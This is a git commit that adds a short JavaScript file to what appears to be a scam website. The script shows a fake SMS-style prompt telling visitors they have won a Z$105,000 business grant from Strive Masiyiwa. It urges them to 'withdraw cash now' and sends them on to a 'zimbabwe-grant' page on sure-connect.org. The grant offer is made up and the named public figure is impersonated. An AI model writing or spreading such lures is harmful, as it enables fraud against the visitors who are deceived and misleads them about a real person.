bd4f38693615d5206fdaaf6d87844e0c7f3e560c
sureconnect001 <ukpe247@gmail.com>
2025-08-30 09:42:47 +0100

    Create zw-active.js

---
+++ zw-active.js
@@ -0,0 +1,5 @@
+var password = 'WITHDRAW Z$105,000'
+password=prompt('SMS: Congratulations, you are among the selected ones to receive Z$105,000 Business Support Grant from Strive Masiyiwa, Press Ok to withdraw cash Now ','WITHDRAW Z$105,000');
+if (password != 'WITHDRAW Z$105,000') {
+location.href='https://sure-connect.org/zimbabwe-grant.html';
+}
